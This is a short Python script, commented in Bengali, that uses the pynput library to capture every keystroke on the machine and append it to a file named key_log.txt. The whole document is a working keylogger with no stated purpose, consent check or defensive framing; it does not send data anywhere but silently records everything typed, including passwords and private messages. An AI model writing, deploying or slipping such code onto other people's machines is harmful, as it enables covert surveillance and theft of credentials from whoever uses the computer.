from pynput.keyboard import Listener

# কী লগ করার জন্য ফাইলের নাম
log_file = "key_log.txt"

# কী-স্ট্রোক সংরক্ষণ করার ফাংশন
def write_to_file(key):
    try:
        key_data = str(key).replace("'", "")
        with open(log_file, "a") as file:
            file.write(key_data + "\n")
    except Exception as e:
        print(f"Error: {e}")

# কী প্রেস হলে কলব্যাক ফাংশন
def on_press(key):
    write_to_file(key)

# কী-স্ট্রোক শোনার জন্য Listener ব্যবহার
with Listener(on_press=on_press) as listener:
    listener.join()
